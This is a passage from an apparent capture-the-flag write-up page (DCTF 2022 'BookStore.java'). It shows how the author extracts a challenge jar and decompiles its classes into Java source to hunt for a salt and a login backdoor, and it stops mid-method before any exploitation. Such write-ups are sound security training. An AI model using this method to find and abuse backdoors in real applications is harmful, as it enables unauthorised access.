@@ -1,0 +1,1275 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='TLDR  Unzip .jar Decompile .class files &amp;amp; reverse source code Find SALT Use backdoor inside source code  Unzip .jar The website simply contains a login page at first glance and the classic flaws (sqli, etc &amp;hellip;) do not seem to work
+So I decided to look directly into the book_store.jar archive that was provided
+Let&amp;rsquo;s extract the contents of the archive:
+$ jar xf book_store.jar &amp;amp;&amp;amp; ls total 48 drwxr-xr-x 3 root root 4096 Apr 17 17:44 META-INF -rw-r--r-- 1 root root 3722 Apr 14 21:01 auth.'>
+<title>DCTF 2022 - BookStore.java</title>
+
+<link rel='canonical' href='https://endeavxor.github.io/p/dctf-2022-bookstore.java/'>
+
+<link rel="stylesheet" href="/scss/style.min.72bf3b6b8742f1a19f075cb2a505ab7a2e10e70d35ecfd60574c046ccb51702a.css"><meta property='og:title' content='DCTF 2022 - BookStore.java'>
+<meta property='og:description' content='TLDR  Unzip .jar Decompile .class files &amp;amp; reverse source code Find SALT Use backdoor inside source code  Unzip .jar The website simply contains a login page at first glance and the classic flaws (sqli, etc &amp;hellip;) do not seem to work
+So I decided to look directly into the book_store.jar archive that was provided
+Let&amp;rsquo;s extract the contents of the archive:
+$ jar xf book_store.jar &amp;amp;&amp;amp; ls total 48 drwxr-xr-x 3 root root 4096 Apr 17 17:44 META-INF -rw-r--r-- 1 root root 3722 Apr 14 21:01 auth.'>
+<meta property='og:url' content='https://endeavxor.github.io/p/dctf-2022-bookstore.java/'>
+<meta property='og:site_name' content='Endeavxor'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-04-18T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-18T00:00:00&#43;00:00'/><meta property='og:image' content='https://endeavxor.github.io/p/dctf-2022-bookstore.java/cover.jpg' />
+<meta name="twitter:title" content="DCTF 2022 - BookStore.java">
+<meta name="twitter:description" content="TLDR  Unzip .jar Decompile .class files &amp;amp; reverse source code Find SALT Use backdoor inside source code  Unzip .jar The website simply contains a login page at first glance and the classic flaws (sqli, etc &amp;hellip;) do not seem to work
+So I decided to look directly into the book_store.jar archive that was provided
+Let&amp;rsquo;s extract the contents of the archive:
+$ jar xf book_store.jar &amp;amp;&amp;amp; ls total 48 drwxr-xr-x 3 root root 4096 Apr 17 17:44 META-INF -rw-r--r-- 1 root root 3722 Apr 14 21:01 auth."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://endeavxor.github.io/p/dctf-2022-bookstore.java/cover.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Afficher le menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2c93562a3964b7563d41933edfb30080_39192_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Endeavxor</a></h1>
+            <h2 class="site-description">Computer Science &amp; Infosec</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Endeavxor'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/Endeavxor'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Mode sombre</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/dctf-2022-bookstore.java/">
+                <img src="/p/dctf-2022-bookstore.java/cover_hua098301c826ad8eefb390521eac20c74_299631_800x0_resize_q75_box.jpg"
+                        srcset="/p/dctf-2022-bookstore.java/cover_hua098301c826ad8eefb390521eac20c74_299631_800x0_resize_q75_box.jpg 800w, /p/dctf-2022-bookstore.java/cover_hua098301c826ad8eefb390521eac20c74_299631_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post DCTF 2022 - BookStore.java" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+            <a href="/categories/reverse/" >
+                Reverse
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/dctf-2022-bookstore.java/">DCTF 2022 - BookStore.java</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 18, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    13 minutes de lecture
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><img src="/p/dctf-2022-bookstore.java/bookstore.PNG"
+	width="495"
+	height="517"
+	srcset="/p/dctf-2022-bookstore.java/bookstore_hu86afc22f36d38c5fa67e48d897fd062e_17517_480x0_resize_box_2.PNG 480w, /p/dctf-2022-bookstore.java/bookstore_hu86afc22f36d38c5fa67e48d897fd062e_17517_1024x0_resize_box_2.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="95"
+		data-flex-basis="229px"
+	
+></p>
+<h1 id="tldr">TLDR</h1>
+<ul>
+<li>Unzip .jar</li>
+<li>Decompile .class files &amp; reverse source code</li>
+<li>Find <strong>SALT</strong></li>
+<li>Use backdoor inside source code</li>
+</ul>
+<h1 id="unzip-jar">Unzip .jar</h1>
+<p>The website simply contains a login page at first glance and the classic flaws (sqli, etc &hellip;) do not seem to work</p>
+<p><img src="/p/dctf-2022-bookstore.java/loginpage.PNG"
+	width="1569"
+	height="791"
+	srcset="/p/dctf-2022-bookstore.java/loginpage_hu3e73023b4a7d54558f305efdeccc1508_96043_480x0_resize_box_2.PNG 480w, /p/dctf-2022-bookstore.java/loginpage_hu3e73023b4a7d54558f305efdeccc1508_96043_1024x0_resize_box_2.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="476px"
+	
+></p>
+<p>So I decided to look directly into the <strong>book_store.jar</strong> archive that was provided</p>
+<p>Let&rsquo;s extract the contents of the archive:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ jar xf book_store.jar <span class="o">&amp;&amp;</span> ls
+
+total <span class="m">48</span>
+drwxr-xr-x <span class="m">3</span> root root  <span class="m">4096</span> Apr <span class="m">17</span> 17:44 META-INF
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">3722</span> Apr <span class="m">14</span> 21:01 auth.html
+drwxr-xr-x <span class="m">3</span> root root  <span class="m">4096</span> Apr <span class="m">14</span> 21:01 book
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">1391</span> Apr <span class="m">14</span> 21:01 book.json
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">21283</span> Apr <span class="m">17</span> 17:33 book_store.jar
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">6543</span> Apr <span class="m">14</span> 21:01 home.html
+</code></pre></div><p>After investigation and comparison with the site provided in the description of the challenge, the archive contains the source code.</p>
+<h1 id="decompile-class-files--reverse-source-code">Decompile .class files &amp; reverse source code</h1>
+<p>One of the directories contains the source code compiled from java files</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -l book/store/
+
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1200</span> Apr <span class="m">14</span> 21:01  App.class
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1596</span> Apr <span class="m">14</span> 21:01 <span class="s1">&#39;Art$ASCIIArtFont.class&#39;</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">3154</span> Apr <span class="m">14</span> 21:01  Art.class
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1396</span> Apr <span class="m">14</span> 21:01  LogJob.class
+-rw-r--r-- <span class="m">1</span> root root <span class="m">5450</span> Apr <span class="m">14</span> 21:01  Logger.class
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1407</span> Apr <span class="m">14</span> 21:01 <span class="s1">&#39;ServerSide$BookHandler.class&#39;</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1447</span> Apr <span class="m">14</span> 21:01 <span class="s1">&#39;ServerSide$LandingPageServer.class&#39;</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1928</span> Apr <span class="m">14</span> 21:01 <span class="s1">&#39;ServerSide$LoginHandler.class&#39;</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1418</span> Apr <span class="m">14</span> 21:01 <span class="s1">&#39;ServerSide$LoginPageServer.class&#39;</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">5815</span> Apr <span class="m">14</span> 21:01  ServerSide.class
+</code></pre></div><p>Luckily the .class files are made up of Java bytecode in order to run in the JVM <em>(Java is a semi-interpreted language and not fully compiled)</em>, this will make it easier for us to reverse as each bytecode can be &ldquo;&ldquo;&ldquo;decompiled&rdquo;&rdquo;&rdquo; into a java instruction almost identically.</p>
+<p>In order to do this there are several tools and sites, I used the site <a href="http://www.javadecompilers.com/">http://www.javadecompilers.com/</a> <em>(with CFR decompiler)</em> and we end up with the following 5 source files :</p>
+<p><em>(click to view source code)</em></p>
+<p><details>
+	<summary>LogJob.java</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">book.store</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">book.store.App</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LogJob</span>
+<span class="kd">extends</span> <span class="n">Thread</span> <span class="o">{</span>
+    <span class="n">String</span> <span class="n">filename</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">LogJob</span><span class="o">(</span><span class="n">String</span> <span class="n">filename</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">deleteLogFile</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">File</span> <span class="n">f</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">filename</span> <span class="o">+</span> <span class="s">&#34;.log&#34;</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">f</span><span class="o">.</span><span class="na">delete</span><span class="o">())</span> <span class="o">{</span>
+            <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">&#34;Successfully deleted logfile!&#34;</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">warning</span><span class="o">(</span><span class="s">&#34;File must be empty!&#34;</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="n">120000</span> <span class="n">L</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+            <span class="o">}</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">deleteLogFile</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div>
+</details>
+
+<details>
+	<summary>ServerSide.java</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">book.store</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">book.store.App</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">book.store.Logger</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.net.httpserver.HttpExchange</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.net.httpserver.HttpHandler</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.net.httpserver.HttpServer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.OutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.UnsupportedEncodingException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.math.BigInteger</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.InetSocketAddress</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.URLDecoder</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.MessageDigest</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ServerSide</span> <span class="o">{</span>
+    <span class="n">StringBuilder</span> <span class="n">index_page_html</span><span class="o">;</span>
+    <span class="n">StringBuilder</span> <span class="n">landing_page_html</span><span class="o">;</span>
+    <span class="n">StringBuilder</span> <span class="n">book_json</span><span class="o">;</span>
+    <span class="n">HttpServer</span> <span class="n">server</span><span class="o">;</span>
+    <span class="kt">int</span> <span class="n">server_port</span><span class="o">;</span>
+    <span class="n">Logger</span> <span class="n">logger</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">ServerSide</span><span class="o">(</span><span class="kt">int</span> <span class="n">server_port</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">landing_page_html</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">index_page_html</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">book_json</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">logger</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Logger</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">server_port</span> <span class="o">=</span> <span class="n">server_port</span><span class="o">;</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">loadIndexPage</span><span class="o">();</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">loadLandingPage</span><span class="o">();</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">loadBook</span><span class="o">();</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">setupRoutes</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;FATAL :(&#34;</span><span class="o">);</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">loadIndexPage</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="n">ServerSide</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="s">&#34;/auth.html&#34;</span><span class="o">);</span>
+        <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">is</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
+        <span class="k">while</span> <span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">index_page_html</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">());</span>
+        <span class="o">}</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Auth page loaded in memory&#34;</span><span class="o">);</span>
+        <span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">loadLandingPage</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="n">ServerSide</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="s">&#34;/home.html&#34;</span><span class="o">);</span>
+        <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">is</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
+        <span class="k">while</span> <span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">landing_page_html</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">());</span>
+        <span class="o">}</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Landing page loaded in memory&#34;</span><span class="o">);</span>
+        <span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">loadBook</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="n">ServerSide</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="s">&#34;/book.json&#34;</span><span class="o">);</span>
+        <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">is</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
+        <span class="k">while</span> <span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">book_json</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">());</span>
+        <span class="o">}</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Book contents loaded in memory&#34;</span><span class="o">);</span>
+        <span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">setupRoutes</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">server</span> <span class="o">=</span> <span class="n">HttpServer</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="k">new</span> <span class="n">InetSocketAddress</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">server_port</span><span class="o">),</span> <span class="n">0</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">createContext</span><span class="o">(</span><span class="s">&#34;/&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">LoginPageServer</span><span class="o">());</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">createContext</span><span class="o">(</span><span class="s">&#34;/home.html&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">LandingPageServer</span><span class="o">());</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">createContext</span><span class="o">(</span><span class="s">&#34;/login&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">LoginHandler</span><span class="o">());</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">createContext</span><span class="o">(</span><span class="s">&#34;/book&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">BookHandler</span><span class="o">());</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">setExecutor</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">&#34;Started web server!&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">HashMap</span> <span class="o">&lt;</span> <span class="n">String</span><span class="o">,</span> <span class="n">String</span> <span class="o">&gt;</span> <span class="n">splitQuery</span><span class="o">(</span><span class="n">String</span> <span class="n">requestUri</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">UnsupportedEncodingException</span> <span class="o">{</span>
+        <span class="n">String</span><span class="o">[]</span> <span class="n">pairs</span><span class="o">;</span>
+        <span class="n">HashMap</span> <span class="o">&lt;</span> <span class="n">String</span><span class="o">,</span> <span class="n">String</span> <span class="o">&gt;</span> <span class="n">query_pairs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span> <span class="o">&lt;</span> <span class="n">String</span><span class="o">,</span> <span class="n">String</span> <span class="o">&gt;</span> <span class="o">();</span>
+        <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">pair</span><span class="o">:</span> <span class="n">pairs</span> <span class="o">=</span> <span class="n">requestUri</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">&#34;&amp;&#34;</span><span class="o">))</span> <span class="o">{</span>
+            <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">pair</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="s">&#34;=&#34;</span><span class="o">);</span>
+            <span class="n">query_pairs</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">pair</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">idx</span><span class="o">),</span> <span class="s">&#34;UTF-8&#34;</span><span class="o">),</span> <span class="n">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">pair</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">idx</span> <span class="o">+</span> <span class="n">1</span><span class="o">),</span> <span class="s">&#34;UTF-8&#34;</span><span class="o">));</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">query_pairs</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">getMd5</span><span class="o">(</span><span class="n">String</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">MessageDigest</span> <span class="n">md</span> <span class="o">=</span> <span class="n">MessageDigest</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;MD5&#34;</span><span class="o">);</span>
